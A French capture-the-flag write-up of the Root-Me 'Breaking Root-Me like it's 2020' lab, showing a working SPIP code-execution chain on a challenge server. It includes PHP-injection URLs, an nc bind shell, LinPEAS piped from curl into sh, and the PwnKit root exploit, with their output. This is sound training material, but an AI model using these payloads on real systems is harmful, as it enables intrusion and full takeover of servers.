---
title: Réaliste - Breaking Root-Me like it’s 2020
meta_title: ""
description: Réaliste - Breaking Root-Me like it’s 2020
date: 2024-06-19T18:00:00Z
image: /images/rootme_logo.png
categories:
  - Rootme
  - Réaliste
  - Moyen
author: Demat
tags:
  - web-server
  - php
  - remote-code-execution
  - spip
  - cms
  - privilege-escalation
draft: false
isSecret: true
---

## Description

### Énoncé

**Lien du challenge : [Réaliste - Breaking Root-Me like it’s 2020](https://www.root-me.org/fr/Challenges/Realiste/Breaking-Root-Me-like-it-s-2020)**

> #### Revivre le frisson d’une RCE sur root-me.org
>
> Hello ! Je suis content que tu aies renouvelé ta cotisation annuelle de 15€ !
>
> Voici ton accès au backend de root-me.org, utilise le à bon escient ! ;)
>
> ```text {linenos=table}
> goodguy@contrib.fr:StronkP4ZZ:)
> ```
>
> Le flag se situe dans /flag.txt
>
> #### Ressources associées
>
> - [https://www.spip.net/](https://www.spip.net/)
> - [https://thinkloveshare.com/en/hacking/rce_on_spip_and_root_me/](https://thinkloveshare.com/en/hacking/rce_on_spip_and_root_me/)
>

## Contexte

Il s'agit d'une faille qui a été découverte sur le site web de Root-Me en 2020. C'est un challenge de type RCE (Remote Code Execution) sur un serveur web. Le but est de trouver une faille permettant d'exécuter du code arbitraire sur le serveur distant, afin de lire le contenu du fichier `/flag.txt`.

## Exploitation

### Premiers pas

Pour commencer, on démarre le challenge sur la plateforme CTF All The Day. Pour ma part, il est hébergé sur le serveur `ctf06.root-me.org`.

En visitant `http://ctf06.root-me.org/`, on peut voir que le site web du challenge est un clone minimaliste de Root-Me, basé sur SPIP. Il s'agit d'un système de gestion de contenu (CMS) libre, écrit en PHP et distribué sous licence GPL, qui permet de créer et de gérer un site web dynamique.

Vu qu'un compte de contributeur est fourni, on peut se connecter à l'interface de publication du CMS avec le login `goodguy@contrib.fr` et le mot de passe `StronkP4ZZ:)`.

### Exécution de code arbitraire : article de Laluka

Le second lien fourni dans l'énoncé pointe vers un article de blog qui explique comment l'auteur, Laluka, a réussi à exploiter plusieurs failles de sécurité sur le site web de Root-Me en 2020.
Il a trouvé de multiples vulnérabilités, mais celle qui nous intéresse est la RCE détaillée [vers la fin](https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/#xss-on-oups) de l'article.

Il y donne un exemple de payload qui permet d'exécuter une commande sur le serveur, et d'en afficher le résultat dans la page. Adaptée à notre cas, l'URL est la suivante :

```text
http://ctf06.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='<?php echo fread(popen("id", "r"), 300);?>
```

*A priori*, rien de spécial. Cependant, si on inspecte le code source de la page, on peut voir que l'injection a fonctionné :
![RCE basique](/images/rootme2020/oups-injection.png)

C'est un bon début, mais ce n'est pas très pratique. On peut améliorer le payload pour afficher proprement le résultat de la commande directement sur la page, et augmenter la taille du buffer pour lire plus de 300 caractères :

```text
http://ctf06.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='><pre style="text-align: left"><?php echo fread(popen("id", "r"), 1048576);?></pre><br style='
```

Le résultat est alors bien plus simple à lire :
![RCE plus jolie](/images/rootme2020/oups-injection-pretty.png)

Peut-on directement lire le contenu du fichier `/flag.txt` ? Regardons déjà les permissions du fichier :

```text
http://ctf06.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='><pre style="text-align: left"><?php echo fread(popen("ls -lA /", "r"), 1048576);?></pre><br style='
```

```text {hl_lines=[7,17]}
total 1823824
lrwxrwxrwx   1 root root          7 Jul 31  2020 bin -> usr/bin
drwxr-xr-x   4 root root       4096 Jan  9  2021 boot
drwxr-xr-x   2 root root       4096 Jan  9  2021 cdrom
drwxr-xr-x  18 root root       3980 Jun 20 13:58 dev
drwxr-xr-x  96 root root       4096 Jan 25  2021 etc
-rwx------   1 root root         21 Jan 12  2021 flag.txt
drwxr-xr-x   3 root root       4096 Jan  9  2021 home
lrwxrwxrwx   1 root root          7 Jul 31  2020 lib -> usr/lib
lrwxrwxrwx   1 root root          9 Jul 31  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root          9 Jul 31  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root         10 Jul 31  2020 libx32 -> usr/libx32
drwx------   2 root root      16384 Jan  9  2021 lost+found
drwxr-xr-x   2 root root       4096 Jul 31  2020 media
drwxr-xr-x   2 root root       4096 Jul 31  2020 mnt
drwxr-xr-x   3 root root       4096 Jan  9  2021 opt
-r--------   1 root root         33 Jun 20 13:59 passwd
dr-xr-xr-x 148 root root          0 Jun 20 13:58 proc
drwx------   5 root root       4096 Jan 12  2021 root
drwxr-xr-x  28 root root        840 Jun 20 14:03 run
lrwxrwxrwx   1 root root          8 Jul 31  2020 sbin -> usr/sbin
drwxr-xr-x   6 root root       4096 Jan  9  2021 snap
drwxr-xr-x   2 root root       4096 Jul 31  2020 srv
-rw-------   1 root root 1867513856 Jan  9  2021 swap.img
dr-xr-xr-x  13 root root          0 Jun 20 13:58 sys
drwxrwxrwt   2 root root       4096 Jun 20 13:58 tmp
drwxr-xr-x  14 root root       4096 Jul 31  2020 usr
drwxr-xr-x  14 root root       4096 Jan  9  2021 var
```

Le fichier `/flag.txt` appartient à `root` et n'est accessible en lecture que pour son propriétaire. Il en va de même pour `/passwd`, nécessaire pour valider la box. Le seul moyen de lire ces fichiers est donc d'effectuer une élévation de privilèges.

### Shell interactif

Essayons déjà d'obtenir un shell interactif pour nous faciliter la tâche. Pour cela, on va utiliser `nc` pour ouvrir un *bind shell* sur le port 31337, par le biais d'une FIFO (named pipe) :

```sh
nohup sh -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i|nc -lp 31337 >/tmp/f'
```

```text
http://ctf06.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='><pre style="text-align: left"><?php echo fread(popen("nohup sh -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i|nc -lp 31337 >/tmp/f'", "r"), 1048576);?></pre><br style='
```

On peut maintenant se connecter au shell interactif avec [pwncat]({{< ref "/outils/pwncat-cs/" >}}) :
![Shell interactif avec pwncat](/images/rootme2020/pwncat-1.png)

### Élévation de privilèges

Essayons de trouver une faille d'élévation de privilèges grâce à LinPEAS :

```sh
$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
[...]
╔══════════╣ Executing Linux Exploit Suggester
[...]
[+] [CVE-2021-4034] PwnKit
[...]
```

Entre autres, LinPEAS mentionne la faille [CVE-2021-4034 *"PwnKit"*](https://cyberwatch.fr/cve/cve-2021-4034/), qui affecte Polkit et permet d'obtenir un shell root. Sur Ubuntu 20.04, elle affecte les versions de Polkit inférieures à la version `0.105-26ubuntu1.2`. Vérifions quelle version est installée sur la machine :

```sh
$ dpkg -s policykit-1 | fgrep 'Version'
Version: 0.105-26ubuntu1
```

Bingo ! La version de Polkit semble vulnérable. On peut donc essayer d'exploiter la faille pour obtenir un shell root. J'ai trouvé un exploit fonctionnel sur [GitHub](https://github.com/berdav/CVE-2021-4034) :

```text {hl_lines=["6-11"]}
$ cd /tmp
$ git clone https://github.com/berdav/CVE-2021-4034.git
$ cd CVE-2021-4034
$ make
$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cat /flag.txt
Can[...-censuré-...]
# cat /passwd
df811f94e1e3b4a06f2015a33ec47dc4
```

Et voià, il ne reste plus qu'à valider la box sur la plateforme CTF-ATD et à soumettre le flag !
